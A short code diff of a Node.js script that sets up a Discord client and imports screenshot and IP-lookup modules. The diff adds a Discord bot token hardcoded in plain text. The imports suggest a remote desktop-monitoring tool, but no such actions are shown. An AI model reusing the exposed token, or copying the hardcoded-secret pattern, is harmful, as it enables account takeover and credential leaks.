@@ -2,8 +2,8 @@ const axios = require('axios')
     const fs = require("fs")
 const fetch = require('node-fetch')
 var Discord = require("discord.js")
+var token = "NzQzMjg2NDk4MDMxNTY2ODk4.XzSdfg.uLlz7PuF61E_9DPaDE5_Z6o0ij8"
 var client = new Discord.Client()
-
 var ip = require("ip");
 const screenshot = require('screenshot-desktop')
 client.login(token)
